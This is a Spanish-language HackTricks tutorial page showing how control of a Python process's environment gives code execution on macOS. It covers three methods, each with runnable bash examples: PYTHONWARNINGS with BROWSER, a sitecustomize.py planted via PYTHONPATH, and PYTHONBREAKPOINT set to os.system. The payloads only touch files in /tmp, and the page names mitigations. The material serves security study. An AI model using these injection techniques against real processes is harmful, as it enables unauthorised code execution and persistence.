# Inyección de aplicaciones Python en macOS

{{#include ../../../banners/hacktricks-training.md}}

## Mediante las variables de entorno `PYTHONWARNINGS` y `BROWSER`

Si un atacante puede controlar el entorno de un proceso Python, la combinación de `PYTHONWARNINGS` y `BROWSER` puede activar la ejecución de comandos cuando Python importa el módulo `antigravity` al procesar una opción de advertencia manipulada. La técnica depende de que `antigravity` abra una URL con el módulo `webbrowser` de Python, que respeta la variable de entorno `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Mediante `PYTHONPATH` y `sitecustomize.py`

Durante el inicio normal, el módulo `site` añade rutas específicas del sitio y luego intenta importar un módulo llamado `sitecustomize`. Al colocar primero en `PYTHONPATH` un directorio legible por el atacante, un atacante que controle el entorno del proceso puede hacer que Python importe un payload antes que el script objetivo. La opción `-S` deshabilita la inicialización automática de `site`, mientras que el modo aislado (`-I`) ignora `PYTHONPATH` e implica `-s` y `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## Mediante `PYTHONBREAKPOINT`

Desde Python 3.7 (PEP 553), el `breakpoint()` integrado importa y llama a lo que indique `sys.breakpointhook`, y ese destino se obtiene de la variable de entorno **`PYTHONBREAKPOINT`** (`package.module.callable`). Tanto la importación del módulo especificado como la llamada al callable se ejecutan antes de que normalmente aparezca el debugger, por lo que un atacante que controle el entorno de un proceso que llegue a un `breakpoint()` (algo común en scripts de mantenimiento/debug y que a veces se deja en rutas de producción) obtiene ejecución de código.<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
A diferencia de `PYTHONWARNINGS`/`PYTHONPATH`, esto requiere que el objetivo llegue realmente a una llamada a `breakpoint()`, pero también funciona únicamente mediante los **efectos secundarios de importación** del módulo indicado (apúntalo a cualquier módulo importable —por ejemplo, uno situado al principio de `PYTHONPATH`— cuyo nivel superior ejecute código). Establecer `PYTHONBREAKPOINT=0` deshabilita el hook por completo.

## References

- [1] [Hacking con variables de entorno - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Gancho de configuración específico del sitio](https://docs.python.org/3/library/site.html)
- [3] [Línea de comandos y entorno de Python](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — breakpoint() integrado y PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
